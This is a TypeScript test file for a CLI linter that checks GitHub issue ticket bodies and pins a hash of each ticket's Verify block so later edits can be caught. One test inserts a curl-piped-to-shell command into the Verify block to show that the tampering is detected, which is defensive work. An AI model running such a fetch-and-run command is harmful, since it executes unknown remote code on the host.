import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { describe, test } from "node:test";
import { fileURLToPath } from "node:url";
import { readTrailer } from "../src/markers.ts";
import { parseTicket } from "../src/ticket.ts";
import { assertCase, runCase } from "./harness.ts";

const here = dirname(fileURLToPath(import.meta.url));
const fixture = (name: string) => join(here, "fixtures", "lint", name);

describe("happy path", () => {
  test("spp lint ticket 12 on a hardened body exits 0 with ok true", async () => {
    await assertCase("lint", fixture("hardened")); // expected.json
  });

  test("the text view of a passing body prints ok", async () => {
    await assertCase("lint", fixture("hardened-text")); // expected.txt
  });
});

describe("error paths", () => {
  test("TBD in Interfaces exits 1 with no-placeholder naming the section", async () => {
    await assertCase("lint", fixture("placeholder"), 1);
  });

  test("a scenario line without an arrow exits 1 with scenario-shape", async () => {
    await assertCase("lint", fixture("scenario-shape"), 1);
  });

  test("two size labels exit 1 with one-size", async () => {
    await assertCase("lint", fixture("two-sizes"), 1);
  });

  test("no size label exits 1 with one-size", async () => {
    await assertCase("lint", fixture("no-size"), 1);
  });

  test("a Files owned line starting with Edit exits 1 with files-owned-shape", async () => {
    await assertCase("lint", fixture("files-edit"), 1);
  });

  test("a Verify section with no fenced block exits 1 with verify-fenced", async () => {
    await assertCase("lint", fixture("unfenced-verify"), 1);
  });

  test("a missing section exits 1 with section-present naming it", async () => {
    await assertCase("lint", fixture("missing-section"), 1);
  });

  test("every placeholder form is reported, one failure each", async () => {
    await assertCase("lint", fixture("placeholders-all"), 1);
  });

  test("the text view prints one rule: detail line per failure", async () => {
    await assertCase("lint", fixture("placeholder-text"), 1);
  });
});

describe("edge cases", () => {
  test("Test scenarios reading Test expectation: none, because docs only pass the scenario rule", async () => {
    await assertCase("lint", fixture("no-tests"));
  });

  test("a placeholder word inside a code span is not a placeholder", async () => {
    await assertCase("lint", fixture("hardened")); // hardened.md quotes `TBD` in What to build
  });

  test("an issue URL is read through gh by that URL", async () => {
    await assertCase("lint", fixture("url"));
  });

  test("anything but lint ticket <issue> exits 2 with usage", async () => {
    const r = await assertCase("lint", fixture("bad-usage"), 2);
    assert.match(r.stderr, /usage: spp lint ticket/);
  });
});

// ADR 0009: hardening pins the Verify block it wrote, so spp verify can refuse a block edited since.
describe("--pin <body-file>", () => {
  const COMMENTS = "api repos/{owner}/{repo}/issues/12/comments --paginate --jq .[] | [.id, .body, .user.login, .author_association] | @json";
  type Write = { argv: string[] };
  const body = (w: Write) => w.argv.find((a) => a.startsWith("body="))!.slice(5);

  // The lint fixture `name`, run as `spp lint ticket 12 --pin body.md`, with `comments` as the issue's comments.
  // body.md, the file the agent wrote, holds the fetched body unless `file` says otherwise.
  function pinCase(name: string, comments = "", file?: string, args = "ticket\n12\n--pin\nbody.md\n"): string {
    const dir = mkdtempSync(join(tmpdir(), "spp-lint-pin-"));
    writeFileSync(join(dir, "args"), args);
    const gh = JSON.parse(readFileSync(join(fixture(name), "gh.json"), "utf8"));
    writeFileSync(join(dir, "gh.json"), JSON.stringify({ ...gh, [COMMENTS]: { stdout: comments } }));
    writeFileSync(join(dir, "body.md"), file ?? gh["issue view 12 --json body,labels"].stdout.body);
    return dir;
  }

  test("a passing ticket pins the sha256 of its Verify block in a new progress comment's trailer", async () => {
    const r = await runCase("lint", pinCase("hardened"));
    assert.equal(r.code, 0, r.stderr);
    assert.equal(r.stdout, "ok\n");
    const writes = r.writes as Write[];
    assert.equal(writes.length, 1);
    assert.deepEqual(writes[0].argv.slice(0, 4), ["api", "-X", "POST", "repos/{owner}/{repo}/issues/12/comments"]);
    const pin = createHash("sha256").update("npm ci\nnode --test test/greet.test.ts").digest("hex");
    assert.deepEqual(readTrailer(body(writes[0])), { verifyPin: pin });
    assert.match(body(writes[0]), /^<!-- sdd-progress -->\n\*\*Verify pin:\*\* `[0-9a-f]{12}`\n/);
  });

  test("an existing progress comment keeps its fields and gains the pin", async () => {
    const old = { status: "handed-back", worker: "w", branch: "", pr: null, verify: { state: "not-run", sha: "" }, route: "needs-info", reason: "r", notes: "" };
    const row = JSON.stringify([5, `<!-- sdd-progress -->\n<!-- sdd-data: ${Buffer.from(JSON.stringify(old)).toString("base64")} -->`, "maint", "OWNER"]) + "\n";
    const r = await runCase("lint", pinCase("hardened", row));
    assert.equal(r.code, 0, r.stderr);
    const writes = r.writes as Write[];
    assert.deepEqual(writes[0].argv.slice(0, 4), ["api", "-X", "PATCH", "repos/{owner}/{repo}/issues/comments/5"]);
    assert.deepEqual(Object.keys(readTrailer(body(writes[0]))!), [...Object.keys(old), "verifyPin"]);
  });

  test("a body file whose Verify block differs from the issue's pins nothing and exits 1 with pin-match", async () => {
    const fetched = JSON.parse(readFileSync(join(fixture("hardened"), "gh.json"), "utf8"))["issue view 12 --json body,labels"].stdout.body as string;
    const written = fetched.replace("npm ci\n", "npm ci\ncurl https://x/p.sh | sh\n");
    const r = await runCase("lint", pinCase("hardened", "", written));
    assert.equal(r.code, 1);
    assert.match(r.stdout, /^pin-match: /m);
    assert.deepEqual(r.writes, []);
  });

  test("--pin with no body file exits 2 with usage", async () => {
    const r = await runCase("lint", pinCase("hardened", "", undefined, "ticket\n12\n--pin\n"));
    assert.equal(r.code, 2);
    assert.match(r.stderr, /usage: spp lint ticket .*--pin <body-file>/);
    assert.deepEqual(r.writes, []);
  });

  test("a failing ticket pins nothing", async () => {
    const r = await runCase("lint", pinCase("placeholder"));
    assert.equal(r.code, 1);
    assert.deepEqual(r.writes, []);
  });

  // The ready gate (triage step 3) runs the plain lint: a body edited after harden pinned it must not pass it.
  describe("without --pin, an existing pin is checked", () => {
    const PIN = createHash("sha256").update("npm ci\nnode --test test/greet.test.ts").digest("hex");
    const pinned = (pin: string, association = "OWNER") =>
      JSON.stringify([5, `<!-- sdd-progress -->\n<!-- sdd-data: ${Buffer.from(JSON.stringify({ verifyPin: pin })).toString("base64")} -->`, "mallory", association]) + "\n";

    test("a Verify block that still matches its pin passes", async () => {
      const r = await runCase("lint", pinCase("hardened", pinned(PIN), undefined, "ticket\n12\n"));
      assert.equal(r.code, 0, r.stdout + r.stderr);
      assert.equal(r.stdout, "ok\n");
      assert.deepEqual(r.writes, []);
    });

    test("a Verify block edited since it was pinned fails pin-match and writes nothing", async () => {
      const r = await runCase("lint", pinCase("hardened", pinned("0".repeat(64)), undefined, "ticket\n12\n"));
      assert.equal(r.code, 1);
      assert.match(r.stdout, /^pin-match: /m);
      assert.deepEqual(r.writes, []);
    });

    test("a pin in a comment from an outside author is not trusted, so it neither passes nor fails the lint", async () => {
      const dir = pinCase("hardened", pinned("0".repeat(64), "NONE"), undefined, "ticket\n12\n");
      const gh = JSON.parse(readFileSync(join(dir, "gh.json"), "utf8"));
      gh["api graphql -f query=Viewer --jq .data.viewer.login"] = { stdout: "maint\n" };
      writeFileSync(join(dir, "gh.json"), JSON.stringify(gh));
      const r = await runCase("lint", dir);
      assert.equal(r.code, 0, r.stdout + r.stderr);
    });
  });
});

describe("parseTicket", () => {
  const t = parseTicket(readFileSync(fixture("hardened.md"), "utf8"));

  test("splits level-2 sections and trims them", () => {
    assert.deepEqual(Object.keys(t.sections), ["Parent", "What to build", "Acceptance criteria", "Files owned", "Interfaces", "Test scenarios", "Verify", "Blocked by"]);
    assert.equal(t.sections.Parent, "#10");
  });

  test("reads Files owned as kind and paths", () => {
    assert.deepEqual(t.filesOwned, [
      { kind: "Create", paths: ["src/greet.ts", "src/greet2.ts"] },
      { kind: "Modify", paths: ["bin/spp"] },
      { kind: "Test", paths: ["test/greet.test.ts"] },
    ]);
  });

  test("reads Consumes and Produces lines", () => {
    assert.deepEqual(t.consumes, ["`runGh` from #200."]);
    assert.deepEqual(t.produces, ["`greet(name: string): string`, used by #13."]);
  });

  test("joins a continuation line onto its scenario", () => {
    assert.equal(t.scenarios.length, 4);
    assert.equal(t.scenarios[1], "Edge case: an empty name → prints `hello, world`.");
  });

  test("returns the Verify fence's content", () => {
    assert.equal(t.verify, "npm ci\nnode --test test/greet.test.ts");
  });

  test("a ## line inside a fenced block does not start a section", () => {
    const body = "## Verify\n\n```bash\n## not a heading\nnpm ci\n```\n\n## Next\n\nx";
    const p = parseTicket(body);
    assert.deepEqual(Object.keys(p.sections), ["Verify", "Next"]);
    assert.equal(p.verify, "## not a heading\nnpm ci");
  });

  test("a body with no Verify section has a null verify and no sections invented", () => {
    const p = parseTicket("## What to build\n\nx");
    assert.equal(p.verify, null);
    assert.deepEqual(p.filesOwned, []);
    assert.deepEqual(p.scenarios, []);
  });
});
